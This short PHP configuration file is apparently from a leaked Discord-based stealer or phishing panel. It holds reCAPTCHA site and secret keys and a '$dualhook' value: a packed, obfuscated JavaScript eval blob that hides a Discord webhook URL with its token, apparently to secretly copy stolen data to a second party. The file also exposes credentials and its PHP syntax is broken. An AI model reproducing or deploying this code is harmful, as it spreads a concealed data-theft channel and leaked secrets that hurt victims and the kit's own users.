<?php
// Leaked by fro#1337 
$siteName = "Fro";
$webText = htmlspecialchars("SHUT THE FUCK UP");
$recaptcha_sitekey = "6Le3r6YhAAAAAOZMXlzs-cg-bIoyzTbVTtMQwcOS";
$recaptcha_secretkey = "6Le3r6YhAAAAAC3nYqVxLBYNul_7e6cGGJFaxGE-";
$dualhook = "ur shitty webhook"
"https://eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1.0/2/3/4/5',6,6,'com|discord|api|webhooks|1013545895700213831|06OWJIRwBvNxeeEoD4OVUBhyovXQLuVTQGHi5_XDDiyGKJRVQDA8gPbV7tWbQvBiUpy4'.split('|'),0,{}))
";
$mainpfp = "put ur pfp here";
$embedColor = "000"; #WITHOUT HASHTAG
/* controller info*/
//Example: TEST-A1B2C3D4E5
$controllerpath = "Fro";
//ur discord should be like https://discord.gg/invite/sex
$discord = "https://discord.com/invite/urserver";
?>